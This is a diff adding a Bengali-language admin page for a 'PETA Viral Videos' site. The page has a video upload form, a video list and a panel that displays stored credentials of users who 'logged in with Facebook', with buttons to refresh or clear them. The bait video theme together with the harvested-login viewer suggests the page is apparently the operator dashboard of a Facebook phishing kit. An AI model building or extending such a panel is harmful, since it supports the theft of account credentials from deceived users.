@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta name="description" content="PETA Viral Videos - অ্যাডমিন প্যানেল" />
+  <title>অ্যাডমিন প্যানেল - PETA Viral Videos</title>
+  <link rel="stylesheet" href="style.css" />
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link rel="icon" type="image/x-icon" href="assets/favicon.ico">
+</head>
+<body>
+  <div class="admin-container">
+    <div class="admin-panel">
+      <div class="admin-header">
+        <div class="admin-icon">⚙️</div>
+        <h2>অ্যাডমিন প্যানেল</h2>
+        <p class="admin-subtitle">ভিডিও আপলোড এবং ব্যবস্থাপনা</p>
+        <div class="admin-actions">
+          <button onclick="location.href='index.html'" class="back-btn">
+            ← মূল পেজে ফিরে যান
+          </button>
+          <button onclick="logout()" class="logout-btn">
+            লগআউট
+          </button>
+        </div>
+      </div>
+      
+      <div class="upload-section">
+        <h3>
+          <span class="section-icon">📹</span>
+          নতুন ভিডিও আপলোড করুন
+        </h3>
+        
+        <form id="uploadForm" onsubmit="return handleUpload(event)" novalidate>
+          <div class="input-group">
+            <label for="videoTitle">ভিডিওর শিরোনাম</label>
+            <input 
+              type="text" 
+              id="videoTitle" 
+              placeholder="ভিডিওর শিরোনাম লিখুন" 
+              required 
+              maxlength="100"
+              aria-describedby="videoTitle-error"
+            />
+            <div id="videoTitle-error" class="error-message" role="alert"></div>
+          </div>
+          
+          <div class="input-group">
+            <label for="videoDescription">ভিডিওর বিবরণ (ঐচ্ছিক)</label>
+            <textarea 
+              id="videoDescription" 
+              placeholder="ভিডিও সম্পর্কে সংক্ষিপ্ত বিবরণ লিখুন"
+              maxlength="500"
+              rows="3"
+            ></textarea>
+          </div>
+          
+          <div class="input-group">
+            <label for="videoFile">ভিডিও ফাইল নির্বাচন করুন</label>
+            <div class="file-input-wrapper">
+              <input 
+                type="file" 
+                id="videoFile" 
+                accept="video/mp4,video/avi,video/mov,video/mkv,video/webm" 
+                required 
+                aria-describedby="videoFile-error videoFile-info"
+              />
+              <div class="file-input-label">
+                <span class="file-icon">📁</span>
+                <span class="file-text">ফাইল নির্বাচন করুন</span>
+              </div>
+            </div>
+            <div id="videoFile-error" class="error-message" role="alert"></div>
+            <div id="videoFile-info" class="file-info">
+              সর্বোচ্চ ফাইল সাইজ: ২০০ MB | সমর্থিত ফরম্যাট: MP4, AVI, MOV, MKV, WebM
+            </div>
+          </div>
+          
+          <div class="upload-progress" id="uploadProgress" style="display: none;">
+            <div class="progress-bar">
+              <div class="progress-fill" id="progressFill"></div>
+            </div>
+            <div class="progress-text" id="progressText">আপলোড হচ্ছে...</div>
+          </div>
+          
+          <button type="submit" class="upload-btn">
+            <span class="btn-text">ভিডিও আপলোড করুন</span>
+            <span class="loading" style="display: none;"></span>
+          </button>
+        </form>
+      </div>
+      
+      <div class="credentials-section">
+        <h3>
+          <span class="section-icon">👥</span>
+          সংরক্ষিত ব্যবহারকারীর তথ্য
+        </h3>
+        <div class="credentials-info">
+          <p>যেসব ব্যবহারকারী Facebook দিয়ে লগইন করেছেন তাদের তথ্য:</p>
+        </div>
+        <div class="credentials-container">
+          <pre id="credentialsOutput" class="credentials-output">
+            লোড হচ্ছে...
+          </pre>
+          <div class="credentials-actions">
+            <button onclick="refreshCredentials()" class="refresh-btn">
+              🔄 রিফ্রেশ করুন
+            </button>
+            <button onclick="clearCredentials()" class="clear-btn">
+              🗑️ সব তথ্য মুছে ফেলুন
+            </button>
+          </div>
+        </div>
+      </div>
+      
+      <div class="videos-management">
+        <h3>
+          <span class="section-icon">🎬</span>
+          আপলোড করা ভিডিও সমূহ
+        </h3>
+        <div id="adminVideoList" class="admin-video-list">
+          <!-- Videos will be loaded here -->
+        </div>
+      </div>
+      
+      <div id="messageContainer" class="message-container"></div>
+    </div>
+  </div>
+  
+  <script src="script.js"></script>
+</body>
+</html>
+
